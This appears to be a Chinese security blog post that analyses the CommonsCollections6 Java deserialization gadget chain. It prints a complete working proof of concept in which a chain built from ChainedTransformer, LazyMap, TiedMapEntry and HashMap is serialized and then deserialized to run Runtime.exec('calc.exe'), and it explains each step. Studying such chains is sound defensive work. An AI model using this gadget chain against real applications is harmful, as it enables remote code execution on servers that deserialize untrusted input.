@@ -1,0 +1,265 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java链子分析—CommonsCollections6 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="在java的8u71版本后，AnnotationInvocationHandler类的readObject方法逻辑变化了这就导致了我们的CC1链子失效所以这里有另一种链子较为通用：ysoserial的CommonsCollections6: package org.example;import org.apache.commons.collections.Transformer;import or">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java链子分析—CommonsCollections6">
+<meta property="og:url" content="http://ireel.github.io/2025/03/27/java-cc6/index.html">
+<meta property="og:site_name" content="ivory&#39;s blog">
+<meta property="og:description" content="在java的8u71版本后，AnnotationInvocationHandler类的readObject方法逻辑变化了这就导致了我们的CC1链子失效所以这里有另一种链子较为通用：ysoserial的CommonsCollections6: package org.example;import org.apache.commons.collections.Transformer;import or">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ireel.github.io/img/logo/Java.png">
+<meta property="article:published_time" content="2025-03-27T12:43:35.000Z">
+<meta property="article:modified_time" content="2025-03-27T12:45:33.547Z">
+<meta property="article:author" content="ivory">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ireel.github.io/img/logo/Java.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java链子分析—CommonsCollections6",
+  "url": "http://ireel.github.io/2025/03/27/java-cc6/",
+  "image": "http://ireel.github.io/img/logo/Java.png",
+  "datePublished": "2025-03-27T12:43:35.000Z",
+  "dateModified": "2025-03-27T12:45:33.547Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ivory",
+      "url": "http://ireel.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2025/03/27/java-cc6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java链子分析—CommonsCollections6',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/logo/Java.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">java链子分析—CommonsCollections6</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java链子分析—CommonsCollections6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-27T12:43:35.000Z" title="发表于 2025-03-27 20:43:35">2025-03-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-27T12:45:33.547Z" title="更新于 2025-03-27 20:45:33">2025-03-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86/">知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>在java的8u71版本后，<code>AnnotationInvocationHandler</code><br>类的<code>readObject</code>方法逻辑变化了<br>这就导致了我们的CC1链子失效<br>所以这里有另一种链子较为通用<br>：<code>ysoserial</code>的<code>CommonsCollections6</code>:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Step 1: 构造Transformer链（最终触发Runtime.exec）</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><ul>
+<li><strong>翻译器链子</strong></li>
+</ul>
+<p>这个还是和CC1最后一样，<br>反射调用到<code>Runtime</code>进行命令执行：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+<p>实际上执行的操作:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>此时如果执行:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>则弹出计算器</p>
+<ul>
+<li><strong>LazyMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure>
+这个类的作用是实现一个懒加载<br>怎么实现的呢？<br>看看它的构造方法以及<code>get()</code>方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">                map.put(key, value);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+可见生成对象的时候可以传入一个翻译器作为值加工厂<br>当从<code>LazyMap</code>里get值的时候</li>
+</ul>
+<p>如果没有get到，就会根据键名加工出一个值（<code>value</code>）来<br>返回并加到map中<br>这就实现了翻译操作的触发</p>
+<p>这时候触发弹出计算器的操作：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.get(<span class="string">&quot;ciallo&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>TiedMapEntry</strong></li>
+</ul>
+<p>其设计初衷是简化键值对的绑定操作，并提供延迟加载或动态计算的特性。<br>在实际开发中，它的应用场景相对有限，但在特定需求下可以发挥独特作用。<br>当需要按需生成或加载某些资源（如缓存数据、动态配置）时，<br>结合<code>LazyMap</code>使用<code>TiedMapEntry</code>，<br>可以避免一次性加载所有数据，减少资源消耗</p>
+<p>使用例子：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个 Transformer，按需生成 Value</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">lazyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟耗时操作（如数据库查询）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Generating value for key: &quot;</span> + key);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Value_&quot;</span> + key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 LazyMap，绑定自定义 Transformer</span></span><br><span class="line">Map&lt;String, Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), lazyTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定键与 LazyMap</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;user_123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首次调用 getValue() 触发延迟加载</span></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 输出: Generating value for key: user_123 → Value_user_123</span></span><br><span class="line"></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 直接返回缓存值 → Value_user_123</span></span><br></pre></td></tr></table></figure>
+<p>一般与<code>LazyMap</code>绑定使用<br>他的<code>hashcode</code>方法中调用了触发<code>LazyMap</code>的<code>get</code><br>他的构造方法、<code>hashcode</code>以及<code>getvalue</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">                (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么我们找一找怎么调用他的<code>hashcode</code><br>这个东西非常眼熟<br>我们在<code>URLDNS</code>链子里一起看过<br>现在目标就从调用<code>URL</code>类的<code>hashcode</code><br>转换为了<code>TiedMapEntry</code>的<code>hashcode</code><br>弹出计算器的操作：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">entry.hashCode();</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>HashMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>之后序列化即可:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(hashMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2025/03/27/java-cc6/">http://ireel.github.io/2025/03/27/java-cc6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a></div><div class="post-share"><div class="social-share" data-image="/img/logo/Java.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/26/java-cc1/" title="java链子分析—CommonsCollections1"><img class="cover" src="/img/logo/Java.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">java链子分析—CommonsCollections1</div></div><div class="info-2"><div class="info-item-1">一个触发命令执行的Demopackage org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 &#123;    public static void main(String[] args) throws Exception &#123;    ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up 